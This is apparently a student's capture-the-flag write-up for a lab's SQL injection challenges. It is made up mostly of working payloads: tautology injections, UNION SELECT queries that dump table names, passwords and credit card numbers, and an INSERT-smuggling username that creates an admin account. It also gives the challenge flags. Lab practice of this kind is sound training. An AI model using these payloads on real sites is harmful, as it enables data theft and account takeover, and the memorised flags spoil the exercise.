## SQL Injection ##

Web Exploitation SQL
×
THIS HOLIDAY SEASON Grizzled Vet drinks egg nog and opens a letter. "Dear Sir" "It has come to my attention you've been a bad boy." "...events in Krasnovia..." "...Naughty List..." "Love, Santa" WHEN ONE MAN FIND HIMSELF ON THE NAUGHTY LIST... Grizzled Vet: "Yeah, we did some black ops in Krasnovia. Did some things that will haunt me til I die." HE'LL DO WHATEVER IT TAKES... Grizzled Vet: "But it saved lives! WE SAVED LIVES!!!" TO BE NICE. Grizzled Vet: "I'm in." THIS CHRISTMAS Santa's Elf: "It's the server, sir!" PREPARE Santa: "What about it?" TO GET The Elf: "The SQL. It's been..." INJECTED!!! Grizzled Vet: "Looks like my behavior base isn't the only thing left unsanitized" WEB EX 2: THE SeQueL COMING THIS CHRISTMAS TO AN AOR NEAR YOU RATED R FOR REALLY VULNERABLE DATABASES CHECK YOUR LOCAL MAP FOR CHALLENGES

### DNLA Category 5 ###

On the DNLA site identify the flag using the Categories page.
To answer input the characters inside the flag.

##### Answer ####

1. create a dynamic tunnel to the jumpbox
    `ssh student@10.50.49.22 -D 9050`
    `proxychains nmap -Pn --open 10.100.28.48`
2. From running above, we get:
    Nmap scan report for 10.100.28.48
    Host is up (0.0027s latency).
    Not shown: 998 closed ports
    PORT     STATE SERVICE
    80/tcp   open  http
    4444/tcp open  krb524
3. Do wget on this site
    http:

Go to category from the 10.100.28.48 page. 
Go to 1st category 
Modify the url like so http://10.100.28.48/cases/productsCategory.php?category=1 or 1=1
10.100.28.48/cases/productsCategory.php?category=1 


### Tables 5 ###

How many user created tables are able to be identified through Injection of the web database?

 6
 8
 4
 7
 5

##### Answer ####

list out all the tables and determine which ones are user created

To the answer above, append UNION SELECT table_schema,table_name,column_name FROM information_schema.columns to the url, so, http://10.100.28.48/cases/productsCategory.php?category=1 UNION SELECT table_schema,table_name,column_name FROM information_schema.columns

Then count the tables from the end of the schematics... so... 

categories, members, orderlines, orders, payments, permissions, products and share, giving 8

### Admin credentials 5 ###

Provide the password for users with administrator access to the DNLA database. To answer input the flag.

##### Answer ####

Write the query to provide the password.... 
http://10.100.28.48/cases/productsCategory.php?category=1 Union select id,username,password from sqlinjection.members

flag: hlvAZnST4LIaGVHvOFx8

### Products 5 ###

Utilizing the Search page on DNLA, identify the vulnerability to find the flag. To answer input only the characters inside the flag.

##### Answer ####

In the search bar search for `ram' or 1='1` provided in the instructions... 
flag will be down in the search

### SQL version 5 ###

Identify the version of the database that DNLA is utilizing.
To answer input the full version.

##### Answer ####

http://10.100.28.48/cases/productsCategory.php?category=1 UNION SELECT @@version, database(),3

### Credit card 5 ###

Utilizing the input field on DNLA budget page, find the flag associated with credit cards. To answer the question enter only the characters inside the flag.

##### Answer ####

Write the query to provide the password.... 
http://10.100.28.48/cases/productsCategory.php?category=1 Union select id,creditcard_number,date from sqlinjection.payments

flag -> TEN48vhlKKeMPvUDdN0F

### Id search 5 ###

Find the flag associated with id 1337.

Hint
Look to the left and look to the right.

##### Answer ####

http://10.100.28.48/cases/productsCategory.php?category=1 union select data,comment,id from sqlinjection.share4

De-encode the value from base 64 becomes OlDr6z4EXBKyjWh3xkeR

### Create an Admin User 8 ###

Using the /cases/register.php page on DNLA create a user with admin permissions, ensuring the firstname is set to Hacker. Once created log in to get the flag.

##### Answer ####

find the vulnerable field by inserting 'ram' or 1='1' to all the fields and looking at the output fields... see the one which one is not a string. 

You will find that the username field is the one that is vulnerable. 

For the first name, put the value as Hacker, the Last name put the value as last name. 

The username is the vulnerable field, insert this code `username123', 'password', 'email', 1);# ` into the username field. Put random input to the password and email fields. 
Click register. 

You will be successfully registered. Now login with username123 and password to get your hash. 

Ans -> JMefAxXw7LVqVyaeaApD